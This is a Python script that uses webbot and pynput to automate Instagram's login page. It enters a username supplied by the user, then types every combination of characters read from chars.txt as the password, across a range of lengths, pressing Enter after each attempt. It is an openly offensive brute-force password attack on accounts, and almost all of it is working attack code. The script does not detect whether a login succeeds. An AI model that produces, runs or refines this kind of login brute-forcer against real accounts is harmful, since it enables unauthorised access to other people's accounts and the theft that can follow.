from webbot import Browser
from pynput.keyboard import Key, Controller
import time
from itertools import product

def parseStringToArray(str):
    for i in str:
        bruteforce.append(i)

username = input('Username: ')
min = int(input("Min: "))
maxx = int(input("Max: "))
ch = []
bruteforce = []

file = open(f'chars.txt', 'r')
for line in file:
    line = line.strip()
    ch.append(line)
parseStringToArray(ch[0])

web = Browser()
keyboard = Controller()

web.go_to('www.instagram.com')
time.sleep(3)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
time.sleep(3)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
time.sleep(3)
web.type(username, into="username")
keyboard.press(Key.tab)
keyboard.release(Key.tab)
caracteres = bruteforce
print(caracteres)
minn = min
while minn <= maxx:
    genComb = product(caracteres, repeat=minn)
    for subset in genComb:
        web.type(subset, into="password")
        keyboard.press(Key.enter)
        keyboard.release(Key.enter)
        for x in range(minn):
            keyboard.press(Key.enter)
            keyboard.release(Key.enter)
    minn += 1
